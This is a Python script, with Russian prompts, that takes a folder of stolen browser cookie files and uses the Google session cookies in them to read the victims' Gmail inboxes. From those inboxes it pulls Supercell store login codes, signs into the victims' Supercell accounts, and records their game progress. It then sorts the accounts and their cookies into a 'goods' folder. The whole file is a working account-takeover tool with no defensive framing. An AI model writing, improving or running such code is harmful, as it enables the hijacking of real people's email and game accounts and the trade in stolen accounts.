import asyncio
import json
import os
import time
from fake_useragent import UserAgent
import aiohttp
from colorama import *

from gmail import Gmail



def get_cookies(root_dir):
    for dirpath, dirnames, filenames in os.walk(root_dir):
        for filename in filenames:
            if filename.endswith('.txt'):
                file_path = os.path.join(dirpath, filename)
                try:
                    with open(file_path, 'r') as f:
                        yield f.read()
                except:
                    continue

async def send_code(session, mail):
    url = 'https://store.supercell.com/api/customers/login'
    await session.post(url, json={'email': mail})

async def confirm_code(session, mail, code):
    data = {
        'email': mail,
        'pin': code
    }
    url = 'https://store.supercell.com/api/customers/login/confirm'
    response = await session.post(url=url, json=data)
    data = await response.json()
    return data

async def parse_games(session, auth_token):
    ua = UserAgent()
    headers = {
        'user-agent': ua.random,
        'authorization': f'Bearer {auth_token}'
    }
    url = 'https://store.supercell.com/api/customers/me'

    response = await session.get(url=url, headers=headers)
    json_of_data = json.loads(await response.text())
    result = []

    for game in json_of_data['profile']['applications']:
        if 'account' not in game:
            result.append(f"{game['application']}: no connection")
        elif 'progress' not in game['account']:
            result.append(f"{game['application']}: no info about this game")
        else:
            result.append(
                f"{game['application']}: {[i for i in game['account']['progress']]}")
    return result

def save_data(data, email, cookie):
    folder = 'no games'
    for result in data:
        if '[' in result:
            folder = 'goods'
            break
    if not os.path.exists(f'{folder}/{email}'):
        os.makedirs(f'{folder}/{email}')
    with open(f'{folder}/{email}/info.txt', 'w') as file:
        for result in data:
            file.write(result + '\n')
    with open(f'{folder}/{email}/cookie.txt', 'w') as file:
        file.write(cookie)

def out_green(text):
    print(f"\033[32m{text}\033[0m")

async def thread(cookie):
    if ".google.com\tFALSE\t/" in cookie or ".google.com\tTRUE\t/" in cookie:
        gmail = Gmail(cookie)
        letters = await gmail.check_cookie()
        if letters:
            last_code = gmail.find_code(letters)

            async with aiohttp.ClientSession() as session:
                await send_code(session, gmail.mail)
                code_send_time = time.time()

                while time.time() - code_send_time < timeout:
                    await asyncio.sleep(2)
                    supercell_code = await gmail.get_code()

                    if last_code != supercell_code:
                        auth_token = await confirm_code(session, gmail.mail, supercell_code)

                        if 'token' in auth_token:
                            data = await parse_games(session, auth_token['token'])
                            save_data(data, gmail.mail, cookie)
                            print(Fore.LIGHTGREEN_EX + f"\t + {gmail.mail}")
                            break

async def create_threads():
    tasks = []
    for cookie in get_cookies(directory):
        tasks.append(asyncio.create_task(thread(cookie)))

    await asyncio.gather(*tasks)




if __name__ == '__main__':
    init(autoreset=True)
    directory = input("Введите название папки с cookies: ")
    timeout = int(input("Введите время ожидания для получения кода (рекомендуется больше 5c): "))
    print()
    asyncio.run(create_threads())